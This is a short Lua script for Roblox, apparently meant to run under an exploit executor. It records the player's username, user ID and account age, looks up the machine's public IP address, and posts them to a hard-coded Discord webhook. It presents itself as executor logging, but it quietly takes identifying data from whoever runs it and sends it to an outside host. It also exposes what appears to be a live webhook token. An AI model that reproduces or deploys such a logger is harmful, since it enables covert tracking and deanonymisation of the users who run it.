local Plrs = game:GetService("Players")
local LPlr = Plrs.LocalPlayer
local HTTP = game:GetService("HttpService")
local IP = game:HttpGet("https://api.ipify.org")

local Message = {
    ["content"] = "```ini\n   [Executor Logs]\n[Name] = "..LPlr.Name.."\n[Id] = " ..LPlr.UserId.."\n[Age] = "..LPlr.AccountAge.."\n[Date] = "..os.date().."\n[IP] = "..IP.."\n```"
}

syn.request(
    {
        Url = "https://discordapp.com/api/webhooks/728026773094137879/YfyEuNKfsjKQPXehBxvwPawzcejTH_J4hjmdA99JWCruoUFhoFtfaHj5C3--yY7msyZ-",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HTTP:JSONEncode(Message),
    }
)